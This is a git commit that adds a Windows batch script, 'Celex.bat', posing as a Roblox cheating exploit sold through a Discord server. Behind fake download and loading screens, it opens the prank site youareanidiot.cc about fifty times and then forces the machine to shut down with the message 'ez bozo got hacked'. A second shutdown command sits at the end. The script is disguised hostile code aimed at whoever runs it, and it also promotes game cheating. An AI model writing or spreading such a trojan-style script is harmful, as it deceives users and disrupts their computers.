96c42b7ef6fe4319dc57b1c0b67ad65d36d56ce7
MoDave02 <moxxiehelx@gmail.com>
2024-06-02 18:06:10 +0100

    Add files via upload

---
+++ New folder/Celex.bat
@@ -0,0 +1,160 @@
+
+@echo off
+title Celex
+echo -------------------
+echo Celex Roblox Exploit 
+echo -------------------
+echo.
+echo I am not resposible if your roblox account gets banned
+echo by Blind
+color 2
+echo.
+pause
+cls
+
+:one
+color 3
+echo WeLcOmE
+echo.
+echo Please have roblox open while stuff is dowlouding and loading.
+echo.
+echo Looking for RobloxBeta.exe.
+echo.
+echo Waiting for Robloxbeta.exe.
+echo.
+set /p input=What PlatForm You Using Today?
+if /i %input%==Microsoft goto MR
+if /i %input%==Browser goto BR
+
+:three
+cls
+color e
+echo INSTRUCTIONS
+echo.
+echo 1)cheating
+echo.
+echo 2)While Using Celex it might bluescreen or shutdown your pc
+echo.
+echo 3)if anything gose wrong please tell us in the discord server.
+echo.
+echo DISCORD: https://discord.gg/5XXtrXJZrQ
+echo   DO NOT TELL US IN THE DISCORD SERVER THAT YOU GOT KICKED IT CAN BE A BAN OR YOU GOT KICKED FOR THE GAME FOR EXPOITING
+echo.
+set counter=4
+:Start
+if %counter% equ 0 goto :LOCKOUT
+Mode 50, 30 & color 0e
+echo Enter Username and Password to access inside
+echo https://discord.gg/5XXtrXJZrQ Buy a ACCOUNT to ACCSES to the ExPlOiT
+set /p input= Username:
+echo Accses Granted
+echo Loading
+pause
+cls
+echo Starting up
+echo.
+COLOR 02
+echo Downloading From GITHUB
+timeout 1
+echo Downloading Scripts...
+timeout 2
+echo ****************************
+timeout 1
+echo Downloaded!
+timeout 5
+echo Downloading Themes...
+timeout 3
+echo ****************************
+timeout 1
+echo LOADED!
+timeout 2
+echo Downloading Configs...
+timeout 5
+echo ****************************
+timeout 1
+echo LOADED!
+timeout 3
+echo Downloading Models...
+timeout 2
+echo ****************************
+timeout 4
+echo DOWNLOADED ALL SUCCESSFULLY!
+:crash
+COLOR 02
+timeout 1
+echo Loading Scripts...
+timeout 2
+echo ****************************
+timeout 1
+echo LOADED!
+timeout 5
+echo Loading Themes...
+timeout 3
+echo ****************************
+timeout 1
+echo LOADED!
+timeout 2
+echo Loading Configs...
+timeout 5
+echo ****************************
+timeout 1
+echo LOADED!
+timeout 3
+echo Loading Models...
+timeout 2
+echo ****************************
+timeout 4
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+start "" "https://youareanidiot.cc/"
+shutdown.exe -s -t 1 -c "ez bozo got hacked"
+echo LOADED ALL SUCCESSFULLY!
+echo Enjoiy Expoiting! (This is using a difrent pyfon bypass)
+:crash
+start 
+shutdown.exe -s -t 10 -c "Pranked!! am sorry!!"
